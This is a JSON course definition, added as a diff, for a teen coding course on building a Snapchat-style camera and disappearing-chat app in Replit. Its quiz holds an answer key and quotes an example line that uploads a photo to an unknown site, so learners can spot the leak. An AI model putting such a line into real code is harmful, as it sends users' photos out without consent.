@@ -1,0 +1,506 @@
+{
+  "slug": "build-your-own-snapchat-style-app",
+  "title": "Build Your Own Snapchat-Style App",
+  "tagline": "Build a camera app with your own filters and disappearing messages in a real coding tool. AI helps — you stay in charge.",
+  "category": "apps-websites",
+  "interests": ["coding", "apps", "social", "design"],
+  "difficulty": "builder",
+  "pathways": ["ks4", "sixth_form"],
+  "minAge": 13,
+  "estimatedMinutes": 177,
+  "sessions": 7,
+  "isFree": false,
+  "careers": ["software-development", "product-design", "ux-design"],
+  "skills": ["html-css", "javascript", "prompting-for-code", "reading-ai-code", "camera-apis"],
+  "trailer": {
+    "assetId": "vid-snaplab-trailer",
+    "posterAssetId": "img-snaplab-trailer-poster",
+    "captionsAssetId": "vtt-snaplab-trailer"
+  },
+  "whatYouMake": "A working web app, built in Replit (or Base44), that opens a camera, applies filters you designed, snaps photos, and sends disappearing messages to AI 'friends' in a pretend chat. You submit a private project link, plus screenshots of your filter applied to a provided sample image, cartoon avatar or object (not a photo of a real person), and of the disappearing chat.",
+  "ethicsNote": "We talk about why disappearing messages aren't really gone, how filters affect body image, and why apps should ask before using a camera.",
+  "safeguardingSensitive": false,
+  "watchOut": {
+    "type": "data",
+    "note": "No real messaging between users. Follow the privacy settings in the setup guide. Do not paste API keys or personal information into the tool."
+  },
+  "toolRequirements": [
+    {
+      "toolSlug": "replit",
+      "purpose": "Build, run and share the app",
+      "required": true,
+      "fallbackToolSlug": "base44"
+    }
+  ],
+  "setupGuides": [
+    {
+      "id": "guide-replit",
+      "toolSlug": "replit",
+      "title": "Set up Replit",
+      "lastVerifiedAt": "2026-11-01",
+      "steps": [
+        {
+          "id": "g1",
+          "title": "Create your account",
+          "order": 1,
+          "kind": "create_account",
+          "body": "Open the Replit link from this course. Choose **Sign up**. Use an email you can access, or a sign-in option your parent has agreed to. Do not use your full real name as your public username — a nickname is enough. The guide screenshots show the current sign-up screen."
+        },
+        {
+          "id": "g2",
+          "title": "Verify your email",
+          "order": 2,
+          "kind": "verify_email",
+          "body": "Open the email from Replit and click the verify link. If it does not arrive, check spam, wait a few minutes, then use **Resend**. You need a verified email before you can create a project."
+        },
+        {
+          "id": "g3",
+          "title": "Choose the free plan",
+          "order": 3,
+          "kind": "choose_free_plan",
+          "body": "If you are offered a paid plan, choose **Skip** or **Start with free**. This course is written for the free plan. You do not need to enter a card. If a screen asks for payment, stop and ask a parent — you can complete the project on the free plan."
+        },
+        {
+          "id": "g4",
+          "title": "Turn on privacy settings",
+          "order": 4,
+          "kind": "privacy_settings",
+          "body": "Open account **Settings**, then privacy. Set the project you create later to **Private** (not public). Turn off any optional marketing emails. Do not connect a social account you are not happy to be seen on. If you are under 18, a parent should look at this screen with you."
+        }
+      ]
+    }
+  ],
+  "projectBrief": {
+    "scenario": "A start-up called SnapLab wants a prototype camera app for their pitch day on Friday. You're the developer. Their brief: fun filters, a snap button, and a chat where snaps vanish after viewing.",
+    "deliverables": [
+      "Camera preview with at least 3 filters (1 designed by you)",
+      "A 'Use sample image' button that loads the provided sample image so filters can be tested and screenshotted without a real person in shot",
+      "Snap + save to gallery",
+      "Chat screen with 2 AI friends",
+      "Disappearing message timer",
+      "A private Replit (or Base44) project link"
+    ],
+    "constraints": [
+      "Camera only starts after a clear permission prompt",
+      "No real names or photos of real people in your demo or in what you submit as evidence — test filters on the provided sample image, a cartoon avatar, or an object",
+      "No real messaging between real users",
+      "Explain in your own words what each AI-written function does"
+    ],
+    "stretchGoals": [
+      "Face-tracking sticker on the provided sample image or cartoon avatar (do not submit a photo of a real person)",
+      "Dark mode",
+      "Accessibility: all buttons keyboard-reachable with labels"
+    ],
+    "artefactTypes": ["web_app", "external_link"],
+    "evidence": ["link", "screenshot"]
+  },
+  "modules": [
+    {
+      "id": "m1",
+      "title": "Set up your tool and meet your AI helper",
+      "summary": "Create a Replit account safely and learn to prompt for code you can understand.",
+      "order": 1,
+      "lessons": [
+        {
+          "id": "m1l1",
+          "title": "What we're building",
+          "order": 1,
+          "estimatedMinutes": 15,
+          "steps": [
+            {
+              "id": "s1",
+              "type": "video",
+              "title": "The finished app in 90 seconds",
+              "order": 1,
+              "estimatedMinutes": 3,
+              "assetIds": ["vid-snaplab-trailer", "vtt-snaplab-trailer", "tx-snaplab-trailer"],
+              "completion": { "rule": "view", "threshold": 0.8 },
+              "hints": []
+            },
+            {
+              "id": "s2",
+              "type": "setup_guide",
+              "title": "Create your Replit account",
+              "order": 2,
+              "estimatedMinutes": 11,
+              "config": {
+                "toolSlug": "replit",
+                "guideId": "guide-replit",
+                "throughStepIds": ["g1", "g2", "g3", "g4"]
+              },
+              "completion": { "rule": "setup_acknowledged" },
+              "coachContext": "Talk them through the current setup step. Never ask for their password. If the screenshots look different, tell them a tool may have changed and to use Report so we can update the guide.",
+              "hints": [
+                "Have you verified your email yet?",
+                "Skip any paid plan — the free plan is enough.",
+                "Private project, nickname username, no card needed."
+              ]
+            },
+            {
+              "id": "s13",
+              "type": "checkpoint",
+              "title": "You're set up",
+              "order": 3,
+              "estimatedMinutes": 1,
+              "completion": { "rule": "view" },
+              "hints": []
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "m2",
+      "title": "Camera and filters",
+      "summary": "In Replit, get the camera working and design your own filter.",
+      "order": 2,
+      "lessons": [
+        {
+          "id": "m2l1",
+          "title": "Open the camera (politely)",
+          "order": 1,
+          "estimatedMinutes": 20,
+          "steps": [
+            {
+              "id": "s3",
+              "type": "external_task",
+              "title": "Create the project and ask for camera permission",
+              "order": 1,
+              "estimatedMinutes": 19,
+              "config": {
+                "toolSlug": "replit",
+                "task": "Create a new HTML/JS Replit from the starter the guide names. In camera.js, request the camera only after the user taps a clearly labelled button. If they press Block, show a friendly message.",
+                "clicks": ["Create Repl", "Choose HTML/CSS/JS", "Set the Repl to Private", "Open camera.js"]
+              },
+              "completion": { "rule": "self_tick" },
+              "hints": [
+                "Look up navigator.mediaDevices.getUserMedia.",
+                "What should happen if someone presses Block?",
+                "Wrap the call in try/catch and show a friendly message in the catch."
+              ]
+            },
+            {
+              "id": "s4",
+              "type": "checkpoint",
+              "title": "Camera's live!",
+              "order": 2,
+              "estimatedMinutes": 1,
+              "completion": { "rule": "view" },
+              "hints": []
+            }
+          ]
+        },
+        {
+          "id": "m2l2",
+          "title": "Design a filter",
+          "order": 2,
+          "estimatedMinutes": 42,
+          "steps": [
+            {
+              "id": "s16",
+              "type": "read",
+              "title": "Get the sample image",
+              "order": 1,
+              "estimatedMinutes": 2,
+              "body": "Download the SnapLab sample image below and save it somewhere you can find it again. We made it for this course so you can test and screenshot your filters with nobody in shot. It is an illustration, not a photo of a real person. You will load it into your app in the next step.",
+              "assetIds": ["img-snaplab-sample"],
+              "completion": { "rule": "view" },
+              "hints": []
+            },
+            {
+              "id": "s5",
+              "type": "external_task",
+              "title": "Three built-in filters plus your signature filter",
+              "order": 2,
+              "estimatedMinutes": 40,
+              "config": {
+                "toolSlug": "replit",
+                "task": "Add at least three filters, including one you designed. Add a 'Use sample image' button that loads the provided sample image (you downloaded it in the previous step) in place of the camera. Test your filters on the sample image, a cartoon avatar or an object — that is what you will screenshot later."
+              },
+              "completion": { "rule": "self_tick" },
+              "hints": [
+                "CSS filters like grayscale() are a quick start.",
+                "Store filters in an array and loop through them.",
+                "Canvas lets you change pixel colours directly."
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "m3",
+      "title": "Chat that vanishes",
+      "summary": "Build a pretend chat with AI friends and a disappearing timer, still in Replit.",
+      "order": 3,
+      "lessons": [
+        {
+          "id": "m3l1",
+          "title": "AI friends",
+          "order": 1,
+          "estimatedMinutes": 40,
+          "steps": [
+            {
+              "id": "s6",
+              "type": "external_task",
+              "title": "Create two AI friend characters and wire a pretend chat",
+              "order": 1,
+              "estimatedMinutes": 40,
+              "config": {
+                "toolSlug": "replit",
+                "task": "Add two named characters with a short personality each. Use the tool's built-in AI helper, or a simple scripted reply list, so messages stay on this project only — no real users, no external webhooks to random sites. Read every line the AI writes."
+              },
+              "completion": { "rule": "self_tick" },
+              "coachContext": "If they want to paste an API key, stop them. The course does not need one. Flag any instruction that would send photos off-device.",
+              "hints": [
+                "Do not paste API keys — you do not need any.",
+                "If the helper suggests fetch() to an unknown URL, do not accept it.",
+                "Keep the chat between you and the pretend characters only."
+              ]
+            }
+          ]
+        },
+        {
+          "id": "m3l2",
+          "title": "Disappearing messages and the ethics bit",
+          "order": 2,
+          "estimatedMinutes": 33,
+          "steps": [
+            {
+              "id": "s7",
+              "type": "external_task",
+              "title": "10-second timer",
+              "order": 1,
+              "estimatedMinutes": 20,
+              "config": {
+                "toolSlug": "replit",
+                "task": "After a message is viewed, remove it from the screen after 10 seconds."
+              },
+              "completion": { "rule": "self_tick" },
+              "hints": ["setTimeout is your friend.", "Remove the element, not just hide it."]
+            },
+            {
+              "id": "s8",
+              "type": "ethics_checkpoint",
+              "title": "Is it really gone?",
+              "order": 2,
+              "estimatedMinutes": 8,
+              "body": "Screenshots, screen recordings, servers that keep copies… Decide what your app should promise users — honestly.",
+              "config": {
+                "prompt": "Write one honest sentence your app could show users about disappearing messages."
+              },
+              "completion": { "rule": "self_tick" },
+              "hints": []
+            },
+            {
+              "id": "s9",
+              "type": "quiz",
+              "title": "Quick check",
+              "order": 3,
+              "estimatedMinutes": 4,
+              "config": { "quizId": "q-snaplab-1" },
+              "completion": { "rule": "quiz_pass", "threshold": 0.66 },
+              "hints": []
+            },
+            {
+              "id": "s14",
+              "type": "checkpoint",
+              "title": "Chat and ethics done",
+              "order": 4,
+              "estimatedMinutes": 1,
+              "completion": { "rule": "view" },
+              "hints": []
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "m4",
+      "title": "Ship it",
+      "summary": "Make sure it runs, then submit your link and screenshots.",
+      "order": 4,
+      "lessons": [
+        {
+          "id": "m4l1",
+          "title": "Submit SnapLab",
+          "order": 1,
+          "estimatedMinutes": 27,
+          "steps": [
+            {
+              "id": "s10",
+              "type": "external_task",
+              "title": "Check it runs and keep it private",
+              "order": 1,
+              "estimatedMinutes": 9,
+              "config": {
+                "toolSlug": "replit",
+                "task": "Run the app once more. Confirm the project is Private. Copy the share link that a parent or teacher could open if you invited them — not a public listing."
+              },
+              "completion": { "rule": "self_tick" },
+              "hints": ["A private share link is enough. Do not make the Repl public."]
+            },
+            {
+              "id": "s11",
+              "type": "reflection",
+              "title": "What did the AI get wrong?",
+              "order": 2,
+              "estimatedMinutes": 5,
+              "config": { "prompt": "Name one thing the AI wrote that you had to fix." },
+              "completion": { "rule": "self_tick" },
+              "hints": []
+            },
+            {
+              "id": "s15",
+              "type": "checkpoint",
+              "title": "Ready to submit",
+              "order": 3,
+              "estimatedMinutes": 1,
+              "completion": { "rule": "view" },
+              "hints": []
+            },
+            {
+              "id": "s12",
+              "type": "submit",
+              "title": "Submit SnapLab",
+              "order": 4,
+              "estimatedMinutes": 12,
+              "config": {
+                "artefactTypes": ["web_app", "external_link"],
+                "evidence": ["link", "screenshot"],
+                "requireRubricSelfCheck": true,
+                "evidenceHint": "Paste your private Replit (or Base44) link. For screenshots, show your filter applied to the provided sample image, a cartoon avatar or an object — not a photo of a real person — and the disappearing chat. Do not upload images or video of real people."
+              },
+              "completion": { "rule": "submit" },
+              "hints": []
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "quizzes": [
+    {
+      "id": "q-snaplab-1",
+      "title": "Disappearing messages",
+      "passMark": 0.66,
+      "questions": [
+        {
+          "id": "q1",
+          "kind": "single",
+          "prompt": "Your app deletes a message after 10 seconds. Which is true?",
+          "options": [
+            {
+              "id": "a",
+              "text": "Nobody can ever see it again",
+              "correct": false,
+              "feedback": "Screenshots and screen recordings still exist."
+            },
+            {
+              "id": "b",
+              "text": "It's gone from your app's screen, but copies may exist elsewhere",
+              "correct": true,
+              "feedback": "Exactly. Be honest with users about this."
+            },
+            {
+              "id": "c",
+              "text": "It's illegal to screenshot it",
+              "correct": false,
+              "feedback": "Not in general — which is why honesty matters."
+            }
+          ]
+        },
+        {
+          "id": "q2",
+          "kind": "single",
+          "prompt": "When should your app ask for camera permission?",
+          "options": [
+            {
+              "id": "a",
+              "text": "As soon as the page loads",
+              "correct": false,
+              "feedback": "Asking before people know why feels creepy."
+            },
+            {
+              "id": "b",
+              "text": "When the user taps something that needs the camera",
+              "correct": true,
+              "feedback": "Ask in context."
+            }
+          ]
+        },
+        {
+          "id": "q3",
+          "kind": "spot_the_problem",
+          "prompt": "The AI wrote: `fetch('https://random-site.com/upload', {body: photo})`. What's the problem?",
+          "options": [
+            {
+              "id": "a",
+              "text": "It sends the photo to an unknown website",
+              "correct": true,
+              "feedback": "Always read AI code for where data goes."
+            },
+            {
+              "id": "b",
+              "text": "Nothing, it's fine",
+              "correct": false,
+              "feedback": "Look at the URL again."
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "rubric": {
+    "criteria": [
+      {
+        "id": "r1",
+        "name": "It works",
+        "description": "Camera, filters, snap and chat all run",
+        "levels": [
+          { "label": "Not yet", "descriptor": "One or more core features don't run" },
+          { "label": "Getting there", "descriptor": "Core features run with some bugs" },
+          { "label": "Nailed it", "descriptor": "Everything runs smoothly" }
+        ]
+      },
+      {
+        "id": "r2",
+        "name": "Your own touch",
+        "description": "Signature filter and design choices",
+        "levels": [
+          { "label": "Not yet", "descriptor": "Only template defaults" },
+          { "label": "Getting there", "descriptor": "Some customisation" },
+          { "label": "Nailed it", "descriptor": "Clearly your own style" }
+        ]
+      },
+      {
+        "id": "r3",
+        "name": "You understand the code",
+        "description": "Can explain what AI-written functions do",
+        "levels": [
+          { "label": "Not yet", "descriptor": "Can't explain most functions" },
+          { "label": "Getting there", "descriptor": "Can explain some" },
+          { "label": "Nailed it", "descriptor": "Can explain all and fixed at least one AI mistake" }
+        ]
+      },
+      {
+        "id": "r4",
+        "name": "Respects users",
+        "description": "Permissions, honesty, privacy",
+        "levels": [
+          {
+            "label": "Not yet",
+            "descriptor": "Camera starts without asking, or the project was made public"
+          },
+          { "label": "Getting there", "descriptor": "Asks permission" },
+          {
+            "label": "Nailed it",
+            "descriptor": "Asks in context, honest message promise, project kept private"
+          }
+        ]
+      }
+    ]
+  },
+  "version": "1.0.0",
+  "guidesLastVerifiedAt": "2026-11-01"
+}
